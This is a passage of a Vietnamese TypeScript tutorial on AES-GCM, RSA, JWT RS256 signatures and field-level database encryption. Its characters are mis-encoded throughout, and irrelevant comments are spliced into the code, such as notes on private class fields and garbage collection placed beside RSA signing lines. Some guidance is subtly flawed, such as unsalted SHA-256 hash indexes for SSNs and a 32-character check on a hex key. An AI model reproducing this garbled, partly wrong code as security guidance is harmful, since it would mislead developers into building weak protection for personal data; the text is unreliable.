 // Thu gom r√°c t·ª± ƒë·ªông: runtime ƒë√°nh d·∫•u v√† qu√©t c√°c object kh√¥ng c√≤n truy c·∫≠p ƒë·ªÉ gi·∫£i ph√≥ng b·ªô nh·ªõ.
  const cipher = crypto.createCipheriv(
    'aes-256-gcm',
    Buffer.from(secretKey, 'hex'), // Ch√∫ gi·∫£i: 32 bytes (256 bits)
    iv
  );

 // Ch√∫ gi·∫£i: Encrypt plaintext
  let encryptedText = cipher.update(plaintext, 'utf8', 'hex');
  encryptedText += cipher.final('hex');

 // Ch√∫ gi·∫£i: Get authentication tag (verify integrity khi decrypt)
  const authTag = cipher.getAuthTag();

  return {
    iv: iv.toString('hex'),
    encryptedText,
    authTag: authTag.toString('hex'),
  };
}

// üîπ DECRYPT - Gi·∫£i m√£ d·ªØ li·ªáu
function decryptAES(encrypted: EncryptedData, secretKey: string): string {
 // Ch√∫ gi·∫£i: Create decipher
  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    Buffer.from(secretKey, 'hex'),
    Buffer.from(encrypted.iv, 'hex')
  );

  // Set authentication tag (verify kh√¥ng b·ªã tamper)
  decipher.setAuthTag(Buffer.from(encrypted.authTag, 'hex'));

 // Ch√∫ gi·∫£i: Decrypt ciphertext
  let plaintext = decipher.update(encrypted.encryptedText, 'hex', 'utf8');
  plaintext += decipher.final('utf8');

  return plaintext;
}

 // Ch√∫ gi·∫£i: üîπ EXAMPLE - Encrypt PII trong database
interface User {
  id: string;
  email: string; // Ch√∫ gi·∫£i: Plaintext (for login)
  phone: string; // Ch√∫ gi·∫£i: Encrypted (sensitive PII)
  ssn: string; // Ch√∫ gi·∫£i: Encrypted (very sensitive)
}

async function saveUser(user: User, encryptionKey: string) {
  const encryptedPhone = encryptAES(user.phone, encryptionKey);
  const encryptedSSN = encryptAES(user.ssn, encryptionKey);

  await db.users.create({
    id: user.id,
    email: user.email, // Kh√¥ng encrypt (c·∫ßn query by email)
    phone: JSON.stringify(encryptedPhone),
    ssn: JSON.stringify(encryptedSSN),
  });
}

async function getUser(userId: string, encryptionKey: string): Promise<User> {
  const dbUser = await db.users.findById(userId);

  const encryptedPhone = JSON.parse(dbUser.phone);
  const encryptedSSN = JSON.parse(dbUser.ssn);

  return {
    id: dbUser.id,
    email: dbUser.email,
    phone: decryptAES(encryptedPhone, encryptionKey),
    ssn: decryptAES(encryptedSSN, encryptionKey),
  };
}
```

**üí° Gi·∫£i Th√≠ch:**

- **AES-256-GCM**:
  - AES = Advanced Encryption Standard (industry standard)
  - 256 = key length (256 bits = 32 bytes)
  - GCM = Galois/Counter Mode (authenticated encryption)
    - V·ª´a encrypt V·ª™A authenticate (detect tampering)
- **IV (Initialization Vector)**:
  - Random 12 bytes cho GCM mode
  - PH·∫¢I unique m·ªói l·∫ßn encrypt
  - Kh√¥ng c·∫ßn secret (l∆∞u c√πng ciphertext)
- **Auth Tag**:
  - 16 bytes tag verify integrity
  - N·∫øu data b·ªã modify ‚Üí decrypt throw error

---

**üîê 2.2. Asymmetric Encryption - RSA (Public/Private Key)**

```typescript
import crypto from 'crypto';

 // Ch√∫ gi·∫£i: =====================================
 // Ch√∫ gi·∫£i: ASYMMETRIC ENCRYPTION WITH RSA
 // Ch√∫ gi·∫£i: =====================================

 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
function generateRSAKeyPair(): { publicKey: string; privateKey: string } {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048, // Ch√∫ gi·∫£i: 2048 bits (secure for most use cases)
    publicKeyEncoding: {
      type: 'spki',
      format: 'pem',
    },
    privateKeyEncoding: {
      type: 'pkcs8',
      format: 'pem',
    },
  });

  return { publicKey, privateKey };
}

// üîπ ENCRYPT v·ªõi PUBLIC KEY - Anyone c√≥ public key c√≥ th·ªÉ encrypt
function encryptRSA(plaintext: string, publicKey: string): string {
  const buffer = Buffer.from(plaintext, 'utf8');

  const encrypted = crypto.publicEncrypt(
    {
      key: publicKey,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256',
    },
    buffer
  );

  return encrypted.toString('base64');
}

// üîπ DECRYPT v·ªõi PRIVATE KEY - Ch·ªâ owner c·ªßa private key m·ªõi decrypt ƒë∆∞·ª£c
function decryptRSA(ciphertext: string, privateKey: string): string {
  const buffer = Buffer.from(ciphertext, 'base64');

  const decrypted = crypto.privateDecrypt(
    {
      key: privateKey,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256',
    },
    buffer
  );

  return decrypted.toString('utf8');
}

 // Ch√∫ gi·∫£i: üîπ EXAMPLE - Secure message exchange
const alice = generateRSAKeyPair();
const bob = generateRSAKeyPair();

 // Ch√∫ gi·∫£i: Alice g·ª≠i message cho Bob
const message = 'Secret meeting at 3pm';
const encryptedMessage = encryptRSA(message, bob.publicKey); // D√πng Bob's public key
console.log('Encrypted:', encryptedMessage);

 // Ch√∫ gi·∫£i: Bob decrypt message
const decryptedMessage = decryptRSA(encryptedMessage, bob.privateKey); // D√πng Bob's private key
console.log('Decrypted:', decryptedMessage); // Ch√∫ gi·∫£i: "Secret meeting at 3pm"

// ‚ö†Ô∏è Alice KH√îNG th·ªÉ decrypt (kh√¥ng c√≥ Bob's private key)
```

**üí° Gi·∫£i Th√≠ch:**

- **RSA Asymmetric**:
  - Public key: Share freely, d√πng ƒë·ªÉ ENCRYPT
  - Private key: Keep secret, d√πng ƒë·ªÉ DECRYPT
  - Math: Easy encrypt, hard decrypt without private key (based on factorization)
- **Use Cases**:
  - HTTPS/TLS handshake (exchange symmetric keys)
  - PGP email encryption
  - SSH authentication
- **Limitations**:
  - Slow (10-100x slower than AES)
  - Size limit (RSA-2048 max ~245 bytes plaintext)
  - ‚Üí Th∆∞·ªùng d√πng ƒë·ªÉ encrypt symmetric key, r·ªìi d√πng AES cho data

---

#### **3Ô∏è‚É£ DIGITAL SIGNATURES - Sign & Verify (Ch·ªØ K√Ω S·ªë)**

> **üí° Xem l·∫°i ph·∫ßn [üîê C. DIGITAL SIGNATURE](#-c-digital-signature---ch·ªØ-k√Ω-s·ªë) ·ªü tr√™n ƒë·ªÉ hi·ªÉu r√µ c∆° ch·∫ø: Sign v·ªõi Private Key (ch·ªâ signer c√≥), Verify v·ªõi Public Key (ai c≈©ng verify ƒë∆∞·ª£c), v√† t·∫°i sao d√πng cho JWT RS256!**

**üîë ƒê·∫∑c ƒêi·ªÉm:**

- **Sign v·ªõi private key**: Ch·ªâ owner c√≥ th·ªÉ sign
- **Verify v·ªõi public key**: Anyone c√≥ th·ªÉ verify
- **Proves authenticity**: Message t·ª´ ƒë√∫ng ng∆∞·ªùi (ch·ªâ h·ªç c√≥ private key)
- **Proves integrity**: Message kh√¥ng b·ªã thay ƒë·ªïi (hash kh·ªõp)

**üìå Use Cases:**

1. **JWT Tokens**: Sign payload v·ªõi RS256
2. **API Authentication**: Verify requests t·ª´ trusted clients
3. **Code Signing**: Verify software kh√¥ng b·ªã tamper
4. **Blockchain**: Sign transactions

**üîç Nh·∫Øc L·∫°i C∆° Ch·∫ø:**

```typescript
// DIGITAL SIGNATURE: ƒê·∫£o ng∆∞·ª£c Encryption!

 // Ch√∫ gi·∫£i: ENCRYPTION (B·∫£o m·∫≠t):
Encrypt v·ªõi: RECEIVER's PUBLIC KEY    ‚Üí Decrypt v·ªõi: RECEIVER's PRIVATE KEY
M·ª•c ƒë√≠ch: Gi·∫•u message, ch·ªâ receiver ƒë·ªçc ƒë∆∞·ª£c

// SIGNATURE (X√°c th·ª±c):
Sign v·ªõi: SIGNER's PRIVATE KEY        ‚Üí Verify v·ªõi: SIGNER's PUBLIC KEY
M·ª•c ƒë√≠ch: Ch·ª©ng minh message t·ª´ signer, ai c≈©ng verify ƒë∆∞·ª£c

// V√ç D·ª§:
const { publicKey, privateKey } = generateKeys();

 // Ch√∫ gi·∫£i: Sign document
const hash = SHA256(document);
const signature = RSA.encrypt(hash, privateKey); // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.

 // Ch√∫ gi·∫£i: Verify signature
const hash1 = SHA256(document);
const hash2 = RSA.decrypt(signature, publicKey); // Ch√∫ gi·∫£i: Verify = Decrypt v·ªõi PUBLIC key
if (hash1 === hash2) console.log("‚úÖ Valid signature!");
```

---

**üîê 3.1. JWT Digital Signature v·ªõi RS256**

```typescript
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

 // Ch√∫ gi·∫£i: =====================================
 // Ch√∫ gi·∫£i: JWT DIGITAL SIGNATURE WITH RS256
 // Ch√∫ gi·∫£i: =====================================

 // Ch√∫ gi·∫£i: üîπ GENERATE RSA KEYS for JWT
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});

 // Ch√∫ gi·∫£i: üîπ SIGN JWT - Server t·∫°o token khi user login
function signJWT(payload: object): string {
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
  const token = jwt.sign(payload, privateKey, {
    algorithm: 'RS256', // Ch√∫ gi·∫£i: RSA with SHA-256
    expiresIn: '1h', // Ch√∫ gi·∫£i: Token expires trong 1 gi·ªù
    issuer: 'my-app', // Ch√∫ gi·∫£i: App name
  });

  return token;
}

 // Ch√∫ gi·∫£i: üîπ VERIFY JWT - Server verify token t·ª´ client
function verifyJWT(token: string): object {
  try {
 // Ch√∫ gi·∫£i: Verify v·ªõi PUBLIC KEY
    const payload = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],
      issuer: 'my-app',
    });

    return payload as object;
  } catch (error) {
    if (error instanceof jwt.TokenExpiredError) {
      throw new Error('Token expired');
    }
    if (error instanceof jwt.JsonWebTokenError) {
      throw new Error('Invalid token');
    }
    throw error;
  }
}

 // Ch√∫ gi·∫£i: üîπ EXAMPLE - Authentication flow
interface JWTPayload {
  userId: string;
  email: string;
  role: string;
}

 // Ch√∫ gi·∫£i: Login ‚Üí Generate JWT
async function login(email: string, password: string): Promise<string> {
  const user = await authenticateUser(email, password);

  const payload: JWTPayload = {
    userId: user.id,
    email: user.email,
    role: user.role,
  };

  const token = signJWT(payload);
  console.log('Generated JWT:', token);
 // Thu gom r√°c t·ª± ƒë·ªông: runtime ƒë√°nh d·∫•u v√† qu√©t c√°c object kh√¥ng c√≤n truy c·∫≠p ƒë·ªÉ gi·∫£i ph√≥ng b·ªô nh·ªõ.

  return token;
}

 // Ch√∫ gi·∫£i: Protected route ‚Üí Verify JWT
async function getProfile(token: string): Promise<JWTPayload> {
  const payload = verifyJWT(token) as JWTPayload;

  console.log('Verified user:', payload.userId);
  return payload;
}

 // Ch√∫ gi·∫£i: üîπ JWT STRUCTURE
// JWT c√≥ 3 ph·∫ßn (separated by dot):
 // Ch√∫ gi·∫£i: HEADER.PAYLOAD.SIGNATURE

 // Ch√∫ gi·∫£i: 1. HEADER (algorithm + type)
const header = {
  alg: 'RS256',
  typ: 'JWT',
};

 // Ch√∫ gi·∫£i: 2. PAYLOAD (claims)
const payload = {
  userId: '123',
  email: 'user@example.com',
  role: 'admin',
  iat: 1234567890, // Ch√∫ gi·∫£i: Issued at
  exp: 1234571490, // Ch√∫ gi·∫£i: Expires at
};

 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
 // Ch√∫ gi·∫£i: signature = RSA-SHA256(
 // Ch√∫ gi·∫£i: base64(header) + '.' + base64(payload),
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
 // Ch√∫ gi·∫£i: )

 // Ch√∫ gi·∫£i: ‚úÖ Verify process:
 // Ch√∫ gi·∫£i: 1. Decode header + payload t·ª´ JWT
 // Ch√∫ gi·∫£i: 2. Compute signature v·ªõi public key
 // Ch√∫ gi·∫£i: 3. Compare v·ªõi signature trong JWT
// 4. N·∫øu match ‚Üí valid, kh√¥ng match ‚Üí tampered
```

**üí° Gi·∫£i Th√≠ch:**

- **RS256** (RSA + SHA-256):
  - Sign v·ªõi private key ‚Üí ch·ªâ server m·ªõi sign ƒë∆∞·ª£c
  - Verify v·ªõi public key ‚Üí client/services verify ƒë∆∞·ª£c
  - SHA-256: Hash algorithm ƒë·ªÉ sign
- **JWT Flow**:
  1. Server sign payload v·ªõi private key
  2. Client l∆∞u token (localStorage/cookie)
  3. Client g·ª≠i token trong Authorization header
  4. Server verify token v·ªõi public key
  5. N·∫øu valid ‚Üí allow access
- **Security**:
  - Private key PH·∫¢I keep secret (tr√™n server)
  - Public key c√≥ th·ªÉ share (cho clients verify)
  - N·∫øu private key leak ‚Üí attacker c√≥ th·ªÉ forge tokens!

---

**üîê 3.2. Manual RSA Signature (Low-Level)**

```typescript
import crypto from 'crypto';

 // Ch√∫ gi·∫£i: =====================================
 // Ch√∫ gi·∫£i: MANUAL RSA DIGITAL SIGNATURE
 // Ch√∫ gi·∫£i: =====================================

// üîπ SIGN DATA - T·∫°o ch·ªØ k√Ω s·ªë
function signData(data: string, privateKey: string): string {
  const sign = crypto.createSign('SHA256');
  sign.update(data);
  sign.end();

  const signature = sign.sign(privateKey, 'base64');
  return signature;
}

// üîπ VERIFY SIGNATURE - X√°c th·ª±c ch·ªØ k√Ω
function verifySignature(
  data: string,
  signature: string,
  publicKey: string
): boolean {
  const verify = crypto.createVerify('SHA256');
  verify.update(data);
  verify.end();

  return verify.verify(publicKey, signature, 'base64');
}

 // Ch√∫ gi·∫£i: üîπ EXAMPLE - API Request Signature
interface APIRequest {
  method: string;
  path: string;
  body: object;
  timestamp: number;
}

 // Ch√∫ gi·∫£i: Client signs request
function signAPIRequest(request: APIRequest, privateKey: string): string {
 // Ch√∫ gi·∫£i: Serialize request to string
  const requestString = JSON.stringify({
    method: request.method,
    path: request.path,
    body: request.body,
    timestamp: request.timestamp,
  });

 // Ch√∫ gi·∫£i: Sign request
  return signData(requestString, privateKey);
}

 // Ch√∫ gi·∫£i: Server verifies request
function verifyAPIRequest(
  request: APIRequest,
  signature: string,
  publicKey: string
): boolean {
  const requestString = JSON.stringify({
    method: request.method,
    path: request.path,
    body: request.body,
    timestamp: request.timestamp,
  });

 // Ch√∫ gi·∫£i: Verify signature
  const isValid = verifySignature(requestString, signature, publicKey);

  if (!isValid) {
    console.log('‚ùå Invalid signature - request tampered or wrong key');
    return false;
  }

 // Ch√∫ gi·∫£i: Check timestamp (prevent replay attacks)
  const now = Date.now();
  const age = now - request.timestamp;

  if (age > 5 * 60 * 1000) {
 // Ch√∫ gi·∫£i: 5 minutes
    console.log('‚ùå Request too old - possible replay attack');
    return false;
  }

  console.log('‚úÖ Signature valid');
  return true;
}

 // Ch√∫ gi·∫£i: Example usage
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});

const request: APIRequest = {
  method: 'POST',
  path: '/api/users',
  body: { name: 'John' },
  timestamp: Date.now(),
};

 // Ch√∫ gi·∫£i: Client signs
const signature = signAPIRequest(request, privateKey);
console.log('Signature:', signature);

 // Ch√∫ gi·∫£i: Server verifies
const isValid = verifyAPIRequest(request, signature, publicKey);
console.log('Valid?', isValid); // Ch√∫ gi·∫£i: true
```

**üí° Gi·∫£i Th√≠ch:**

- **Digital Signature Process**:
  1. Hash data v·ªõi SHA-256
  2. Encrypt hash v·ªõi private key ‚Üí signature
  3. G·ª≠i data + signature
  4. Receiver hash data
  5. Decrypt signature v·ªõi public key
  6. Compare hashes ‚Üí n·∫øu match = valid
- **Security Benefits**:
  - **Authenticity**: Ch·ªâ owner c·ªßa private key m·ªõi sign ƒë∆∞·ª£c
  - **Integrity**: N·∫øu data thay ƒë·ªïi ‚Üí hash kh√°c ‚Üí verify fail
  - **Non-repudiation**: Signer kh√¥ng th·ªÉ deny ƒë√£ sign

---

#### **üìö Khi N√†o D√πng G√¨?**

| Scenario                       | Solution                        | Reason                                |
| ------------------------------ | ------------------------------- | ------------------------------------- |
| **Store passwords**            | bcrypt Hashing                  | One-way, slow (prevent brute-force)   |
| **Verify file integrity**      | SHA-256 Checksum                | Fast, detect corruption/tampering     |
| **Encrypt database PII**       | AES-256-GCM                     | Symmetric, fast, authenticated        |
| **HTTPS/TLS**                  | RSA (key exchange) + AES (data) | RSA slow ‚Üí d√πng cho key, AES cho data |
| **JWT authentication**         | RS256 Digital Signature         | Public verify, private sign           |
| **API request authentication** | HMAC or RSA Signature           | Verify request t·ª´ trusted client      |
| **Webhook verification**       | HMAC-SHA256                     | Shared secret, fast                   |
| **Email encryption (PGP)**     | RSA + AES                       | RSA cho key exchange, AES cho message |

---

#### **üóÑÔ∏è DATABASE ENCRYPTION - M√£ H√≥a Database**

**üìå 3 Chi·∫øn L∆∞·ª£c:**

````
1. Field-Level (App-Level) ‚≠ê RECOMMENDED
   ‚Üí App encrypt tr∆∞·ªõc khi l∆∞u DB
   ‚Üí Encrypt ch·ªâ sensitive fields

2. Database-Level (TDE - Transparent Data Encryption)
   ‚Üí Database t·ª± encrypt to√†n b·ªô
   ‚Üí DBA v·∫´n ƒë·ªçc ƒë∆∞·ª£c

3. Hybrid ‚≠ê BEST PRACTICE
   ‚Üí Passwords: Hash (bcrypt)
   ‚Üí PII: Encrypt (AES-256-GCM)
   ‚Üí Non-sensitive: Plaintext

---

**üîê Implementation - Encryption Service**

```typescript
import crypto from 'crypto';

class FieldEncryptionService {
  private key = Buffer.from(process.env.DB_ENCRYPTION_KEY!, 'hex'); // Ch√∫ gi·∫£i: 32 bytes

  encrypt(plaintext: string): string {
    const iv = crypto.randomBytes(12); // Ch√∫ gi·∫£i: Random IV m·ªói l·∫ßn
    const cipher = crypto.createCipheriv('aes-256-gcm', this.key, iv);

    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
    encrypted += cipher.final('hex');

    const authTag = cipher.getAuthTag();

 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return). D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
    return JSON.stringify({
      iv: iv.toString('hex'),
      data: encrypted,
      tag: authTag.toString('hex')
    });
  }

  decrypt(encryptedString: string): string {
    const { iv, data, tag } = JSON.parse(encryptedString);

    const decipher = crypto.createDecipheriv(
      'aes-256-gcm',
      this.key,
      Buffer.from(iv, 'hex')
    );

    decipher.setAuthTag(Buffer.from(tag, 'hex'));

    let decrypted = decipher.update(data, 'hex', 'utf8');
    decrypted += decipher.final('utf8');

    return decrypted;
  }
}

const encryptionService = new FieldEncryptionService();
````

---

**üîê User Service - Real Example**

```typescript
interface User {
  email: string; // Ch√∫ gi·∫£i: Plaintext (need to search)
  password: string; // Ch√∫ gi·∫£i: Hashed (bcrypt)
  phone: string; // Ch√∫ gi·∫£i: ENCRYPTED (PII)
  ssn: string; // Ch√∫ gi·∫£i: ENCRYPTED (very sensitive)
  role: string; // Ch√∫ gi·∫£i: Plaintext
}

class UserService {
  /**
   * CREATE - Encrypt before save
   */
  async createUser(data: UserDTO) {
    const user = {
      email: data.email, // Ch√∫ gi·∫£i: Plaintext
      password: await bcrypt.hash(data.password, 10), // Ch√∫ gi·∫£i: Hash
      phone: encryptionService.encrypt(data.phone), // Ch√∫ gi·∫£i: Encrypt
      ssn: encryptionService.encrypt(data.ssn), // Ch√∫ gi·∫£i: Encrypt
      role: data.role,
    };

    return await db.users.create(user);
  }

  /**
   * READ - Decrypt after fetch
   */
  async getUser(userId: string) {
    const dbUser = await db.users.findById(userId);

    return {
      ...dbUser,
      phone: encryptionService.decrypt(dbUser.phone), // Ch√∫ gi·∫£i: Decrypt
      ssn: encryptionService.decrypt(dbUser.ssn), // Ch√∫ gi·∫£i: Decrypt
    };
  }

  /**
   * SEARCH by email (plaintext field)
   */
  async findByEmail(email: string) {
    return await db.users.findOne({ email }); // Ch√∫ gi·∫£i: ‚úÖ Works
  }

  /**
   * ‚ö†Ô∏è SEARCH by phone (encrypted field)
   */
  async findByPhone(phone: string) {
    // ‚ùå KH√îNG th·ªÉ: db.users.findOne({ phone })
 // Ch√∫ gi·∫£i: Phone is encrypted in DB!

 // Ch√∫ gi·∫£i: ‚úÖ Solution: Hash index
    const phoneHash = crypto.createHash('sha256').update(phone).digest('hex');
    return await db.users.findOne({ phoneHash });
  }
}
```

---

**üîê Database Schema**

```sql
CREATE TABLE users (
  id UUID PRIMARY KEY,

  -- Plaintext (searchable)
  email VARCHAR(255) UNIQUE NOT NULL,
  role VARCHAR(50) NOT NULL,

  -- Hashed (bcrypt)
  password VARCHAR(255) NOT NULL,

  -- Encrypted (AES-256-GCM JSON string)
  phone TEXT NOT NULL,
  ssn TEXT NOT NULL,

  -- Hash indexes (for searching encrypted fields)
  phone_hash VARCHAR(64),  -- SHA-256 of phone
  ssn_hash VARCHAR(64),    -- SHA-256 of SSN

  INDEX idx_email (email),
  INDEX idx_phone_hash (phone_hash)
);

-- Example row:
-- email: "user@email.com"
-- password: "$2b$10$abc..."
-- phone: "{\"iv\":\"f3a2\",\"data\":\"8k2p\",\"tag\":\"m9x1\"}"
-- phone_hash: "e3b0c44298fc1c..."
```

---

**üîë Key Management**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: Hardcode key
const KEY = 'my-secret-key-12345678901234567890';

 // Ch√∫ gi·∫£i: ‚ö†Ô∏è OK: Environment variable (dev only)
const KEY = process.env.DB_ENCRYPTION_KEY;

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: AWS KMS / Azure Key Vault
import { KMSClient, DecryptCommand } from '@aws-sdk/client-kms';

class KMSService {
  async getKey(): Promise<Buffer> {
    const kms = new KMSClient({ region: 'us-east-1' });
    const command = new DecryptCommand({
      KeyId: process.env.KMS_KEY_ID,
      CiphertextBlob: Buffer.from(process.env.ENCRYPTED_KEY!, 'base64'),
    });

    const response = await kms.send(command);
    return Buffer.from(response.Plaintext!);
  }
}

 // Ch√∫ gi·∫£i: ‚úÖ BEST: Envelope Encryption
 // Ch√∫ gi·∫£i: - Master Key (KMS): Encrypt/decrypt Data Encryption Keys
 // Ch√∫ gi·∫£i: - Data Encryption Key (DEK): Encrypt actual data
 // Ch√∫ gi·∫£i: - Master key never leaves KMS
```

---

**üîç Searchable Encryption Pattern**

```typescript
class SearchableEncryption {
  /**
   * Save with hash index
   */
  async saveUser(data: UserDTO) {
    const phoneHash = crypto
      .createHash('sha256')
      .update(data.phone)
      .digest('hex');

    await db.users.create({
      email: data.email,
      phone: encryptionService.encrypt(data.phone), // Ch√∫ gi·∫£i: Encrypted
      phoneHash, // Ch√∫ gi·∫£i: Hash for search
    });
  }

  /**
   * Search by hash
   */
  async findByPhone(phone: string) {
    const hash = crypto.createHash('sha256').update(phone).digest('hex');
    const user = await db.users.findOne({ phoneHash: hash });

    if (!user) return null;

    return {
      ...user,
      phone: encryptionService.decrypt(user.phone), // Ch√∫ gi·∫£i: Decrypt result
    };
  }
}

/**
 * ‚ö†Ô∏è Limitations:
 * - ‚úÖ Exact match: phone = "+1234567890"
 * - ‚ùå Partial match: phone LIKE "%567%"
 * - ‚ùå Range query: phone > "1000"
 */
```

---

**üîÑ Key Rotation**

```typescript
class KeyRotation {
  /**
   * Rotate encryption key
   */
  async rotateKey() {
 // Ch√∫ gi·∫£i: 1. Generate new key
    const newKey = crypto.randomBytes(32);

 // Ch√∫ gi·∫£i: 2. Keep old key (for decryption)
    const oldKey = this.getCurrentKey();

 // Ch√∫ gi·∫£i: 3. Re-encrypt all data (background job)
    const users = await db.users.findAll();
    for (const user of users) {
      const decrypted = this.decryptWithOldKey(user.phone, oldKey);
      const reencrypted = this.encryptWithNewKey(decrypted, newKey);
      await db.users.update(user.id, { phone: reencrypted });
    }

 // Ch√∫ gi·∫£i: 4. Delete old key after all data re-encrypted
  }
}

/**
 * Best Practice:
 * - Rotate every 90 days (compliance)
 * - Version keys: { version: 2, data: "..." }
 * - Keep old keys for 30 days (grace period)
 */
```

---

**‚úÖ Best Practices**

```typescript
 // Ch√∫ gi·∫£i: What to encrypt?
‚úÖ Phone numbers, SSN, addresses
‚úÖ Credit card numbers
‚úÖ Medical records
‚úÖ Financial data

 // Ch√∫ gi·∫£i: What NOT to encrypt?
‚ùå Passwords ‚Üí Use hashing (bcrypt)
‚ùå Email ‚Üí Need for search/login
‚ùå Username, role ‚Üí Not sensitive

 // Ch√∫ gi·∫£i: Key Management
‚úÖ Store keys in: AWS KMS, Azure Key Vault, HashiCorp Vault
‚ùå NEVER hardcode keys in source code
‚ùå NEVER store keys in database

 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
‚ö° AES-256-GCM: ~1-5ms per field
‚ö° Only encrypt sensitive fields
‚ö° Use caching for frequently accessed data
‚ö° Batch operations when possible

 // Ch√∫ gi·∫£i: Compliance
üìã GDPR: Right to be forgotten, data portability
üìã HIPAA: PHI encryption requirements
üìã PCI-DSS: Credit card data encryption
```

---

**‚ö†Ô∏è Common Mistakes**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå Mistake 1: Encrypt passwords
const encrypted = encrypt(password); // Ch√∫ gi·∫£i: WRONG!
 // Ch√∫ gi·∫£i: ‚úÖ Fix: Hash passwords
const hashed = await bcrypt.hash(password, 10);

 // Ch√∫ gi·∫£i: ‚ùå Mistake 2: Reuse IV
const iv = Buffer.from('1234567890123456'); // Ch√∫ gi·∫£i: WRONG!
 // Ch√∫ gi·∫£i: ‚úÖ Fix: Random IV m·ªói l·∫ßn
const iv = crypto.randomBytes(12);

 // Ch√∫ gi·∫£i: ‚ùå Mistake 3: No hash index for search
 // Ch√∫ gi·∫£i: ‚úÖ Fix: Maintain phone_hash, ssn_hash columns

 // Ch√∫ gi·∫£i: ‚ùå Mistake 4: Encrypt everything
 // Ch√∫ gi·∫£i: ‚úÖ Fix: Only encrypt sensitive PII
```

1. ‚ùå Encrypting passwords (use hashing!)
2. ‚ùå Storing keys in database
3. ‚ùå Using same IV/salt
4. ‚ùå Encrypting everything (performance hit)
5. ‚ùå No key rotation strategy
6. ‚ùå Not planning for key compromise
7. ‚ùå Ignoring query limitations

---

#### **üî• Best Practices**

**‚úÖ DO:**

1. **Passwords**: D√πng bcrypt/argon2, KH√îNG d√πng SHA-256
2. **Sensitive data**: Encrypt v·ªõi AES-256-GCM trong database
3. **HTTPS**: Always enable trong production
4. **JWT**: D√πng RS256 (kh√¥ng d√πng HS256 v·ªõi shared secret)
5. **Key rotation**: Rotate encryption keys ƒë·ªãnh k·ª≥
6. **IV/Salt**: Always random, unique m·ªói l·∫ßn
7. **Secrets**: Store trong environment variables/secret managers

**‚ùå DON'T:**

1. **KH√îNG d√πng MD5/SHA-1**: Deprecated, vulnerable
2. **KH√îNG hardcode keys**: Trong source code
3. **KH√îNG reuse IV**: Trong AES encryption
4. **KH√îNG d√πng ECB mode**: Trong AES (d√πng GCM/CBC)
5. **KH√îNG share private keys**: Keep secret!
6. **KH√îNG d√πng custom crypto**: D√πng libraries proven secure

---

#### **üéØ Common Mistakes & Corrections**

**‚ùå Mistake 1: D√πng SHA-256 cho passwords**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD - SHA-256 too fast, vulnerable to brute-force
const hashedPassword = crypto
  .createHash('sha256')
  .update(password)
  .digest('hex');
```

**‚úÖ Correction:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ GOOD - bcrypt slow, secure
const hashedPassword = await bcrypt.hash(password, 10);
```

---

**‚ùå Mistake 2: Reuse IV trong AES**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD - Same IV for multiple encryptions
const iv = Buffer.from('1234567890123456');
const cipher1 = crypto.createCipheriv('aes-256-gcm', key, iv);
const cipher2 = crypto.createCipheriv('aes-256-gcm', key, iv); // Ch√∫ gi·∫£i: ‚ùå Same IV!
```

**‚úÖ Correction:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ GOOD - Random IV m·ªói l·∫ßn
const iv1 = crypto.randomBytes(12);
const iv2 = crypto.randomBytes(12); // Ch√∫ gi·∫£i: Different IV
```

---

**‚ùå Mistake 3: Hardcode encryption keys**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD - Key in source code
const key = 'my-secret-key-12345678901234567890';
```

**‚úÖ Correction:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ GOOD - Key from environment
const key = process.env.ENCRYPTION_KEY;
if (!key || key.length !== 32) {
  throw new Error('Invalid ENCRYPTION_KEY');
}
```

---

**‚ùå Mistake 4: Kh√¥ng verify JWT signature**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD - Decode without verify
const payload = JSON.parse(
  Buffer.from(token.split('.')[1], 'base64').toString()
